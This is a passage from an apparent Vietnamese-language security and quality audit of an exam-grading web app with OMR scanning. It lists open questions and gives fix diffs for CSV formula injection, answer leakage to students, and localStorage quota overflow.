1. **Môi trường Deploy thực tế của Python AI Service:** Trong repository có thư mục `ai-service` chạy FastAPI, nhưng chưa rõ trên môi trường Production (Vercel) dịch vụ này được host riêng trên VPS/Cloud Run hay phụ thuộc hoàn toàn vào fallback Gemini Vision OMR.
2. **Bộ ảnh kiểm thử thực tế (Benchmark Dataset):** Hiện mã nguồn chỉ có file `test_omr.py` kiểm thử trên ảnh đồ họa sinh nhân tạo (`synthesize_filled_exam`). Chưa có bộ dữ liệu ảnh chụp điện thoại thực tế trong lớp học (với các góc nghiêng, ánh sáng yếu, bóng tay, nếp gấp) để kiểm chứng độ chính xác thực tế của OMR.

---

## KHUNG ĐỀ XUẤT SỬA CHI TIẾT CHO CÁC LỖI HIGH+

### 1. Sửa Lỗ hổng CSV Formula Injection (GRD-03)
**File cần sửa:** `frontend/src/app/(dashboard)/grading/page.tsx:1059-1064`
```diff
+    const sanitizeCsvCell = (val: any): string => {
+      let str = String(val ?? "");
+      // Nếu bắt đầu bằng ký tự công thức, thêm dấu nháy đơn phía trước
+      if (/^[=+\-@\t\r]/.test(str)) {
+        str = "'" + str;
+      }
+      // Escape dấu ngoặc kép theo chuẩn RFC 4180
+      return `"${str.replace(/"/g, '""')}"`;
+    };
+
     session.gradedStudents.forEach((std, idx) => {
       const answersStr = Object.entries(std.studentAnswers)
         .map(([q, ans]) => `Câu ${q}:${ans}`)
         .join("; ");
-      csvContent += `"${idx + 1}","${std.studentCode}","${std.studentName}","${std.score}","${std.correctCount}","${std.incorrectCount}","${std.gradedAt}","${answersStr}"\n`;
+      csvContent += [
+        sanitizeCsvCell(idx + 1),
+        sanitizeCsvCell(std.studentCode),
+        sanitizeCsvCell(std.studentName),
+        sanitizeCsvCell(std.score),
+        sanitizeCsvCell(std.correctCount),
+        sanitizeCsvCell(std.incorrectCount),
+        sanitizeCsvCell(std.gradedAt),
+        sanitizeCsvCell(answersStr),
+      ].join(",") + "\n";
     });
```

---

### 2. Sửa Lỗ hổng Lộ đáp án khi học sinh tự nộp bài (GRD-04)
**File cần sửa:** `frontend/src/lib/grading/student-submission-store.ts:167-198`
```diff
     if (!studentAns) {
       emptyCount++;
       details.push({
         questionNumber: q,
         studentAnswer: "",
-        correctAnswer: correctAns,
+        correctAnswer: "", // Không lộ đáp án trong lúc kỳ thi còn mở
         isCorrect: false,
       });
     } else if (studentAns === correctAns) {
       correctCount++;
       details.push({
         questionNumber: q,
         studentAnswer: studentAns,
-        correctAnswer: correctAns,
+        correctAnswer: "",
         isCorrect: true,
       });
     } else {
       incorrectCount++;
       details.push({
         questionNumber: q,
         studentAnswer: studentAns,
-        correctAnswer: correctAns,
+        correctAnswer: "",
         isCorrect: false,
       });
     }
```

---

### 3. Sửa Lỗ hổng Tràn hạn ngạch LocalStorage khi lưu kết quả OMR (GRD-01)
**File cần sửa:** `frontend/src/lib/api/grading-sessions.ts:262-278`
```diff
 export async function saveGradingSession(session: ExamSession): Promise<void> {
+  // Loại bỏ chuỗi ảnh Base64 trước khi ghi vào LocalStorage để không vượt quá quota 5MB
+  const sessionToStoreLocally: ExamSession = {
+    ...session,
+    gradedStudents: session.gradedStudents.map(({ annotatedImage, ...rest }) => rest),
+  };
+
   // 1. Lưu tức thì vào LocalStorage
   if (typeof window !== "undefined") {
     try {
       const raw = localStorage.getItem(LOCAL_STORAGE_KEY);
       let list: ExamSession[] = raw ? JSON.parse(raw) : [];
       const idx = list.findIndex((s) => s.id === session.id);
       if (idx >= 0) {
-        list[idx] = session;
+        list[idx] = sessionToStoreLocally;
       } else {
-        list = [session, ...list];
+        list = [sessionToStoreLocally, ...list];
       }
       localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(list));
     } catch (e) {
       console.warn("Lỗi lưu local session:", e);
     }
   }
```
